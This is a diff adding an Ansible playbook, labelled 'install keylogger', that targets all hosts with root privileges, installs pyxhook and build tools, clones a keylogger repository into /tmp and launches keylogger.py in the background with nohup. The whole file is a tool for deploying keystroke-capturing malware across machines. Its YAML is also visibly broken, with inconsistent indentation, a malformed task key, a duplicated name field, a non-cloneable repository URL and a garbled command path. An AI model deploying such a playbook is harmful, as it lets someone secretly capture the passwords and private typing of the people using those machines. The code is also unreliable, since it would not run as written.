@@ -1,0 +1,41 @@
+#Garrett Thompson
+#install keylogger
+#9/24/24
+---
+- name: install keylogger
+  hosts: all
+  become: yes
+  tasks:
+    -name: update system
+    apt:
+      update_cache: yes
+      upgrade: dist
+
+    - name: Ensure pip is installed
+      ansible.builtin.package:
+      name: python3-pip
+      state: present
+    
+    - name: Install dependency using pip
+    ansible.builtin.pip:
+        name: pyxhook
+        state: present
+    - name: Install Git and dependencies
+      apt:
+        name:
+          name: 
+          - git
+          - build-essential
+          - autoconf
+          - automake
+          state: present
+      - name: Download keylogger from github
+        git:
+          repo: https://github.com/GiacomoLaw/Keylogger/tree/master/linux
+          dest: /tmp/keylogger
+          update: yes
+
+      - name: run installer
+        command: .w/nohup python3 keylogger.py 
+        args:
+          chdir: /tmp/keylogger
